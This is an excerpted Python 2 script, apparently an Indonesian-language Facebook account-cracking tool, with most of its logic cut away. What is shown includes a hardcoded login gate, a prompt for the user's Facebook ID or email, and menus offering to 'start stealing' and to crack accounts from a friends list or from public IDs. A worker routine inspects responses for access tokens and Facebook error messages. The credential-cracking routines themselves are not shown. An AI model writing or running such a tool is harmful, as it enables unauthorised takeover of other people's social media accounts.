...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:RAMDANI
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		print logo
		print 42*"="
		print('[⚡] Login Dengan Akun Baru [⚡]' )
		id = raw_input('[+] Enter ID/Email : ')
...
def menu():
	...
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] Mulai Maling"
	print "\033[1;32;40m[0] Keluar"
	pilih()
...
def super():
	...
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[type1] Crack Daftar Teman"
	print "\x1b[1;32;40m[type2] Crack Publik ID"
	print "\x1b[1;32;40m[type0] Keluar"
	pilih_super()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'm.facebook.com' in q["error_msg"]:
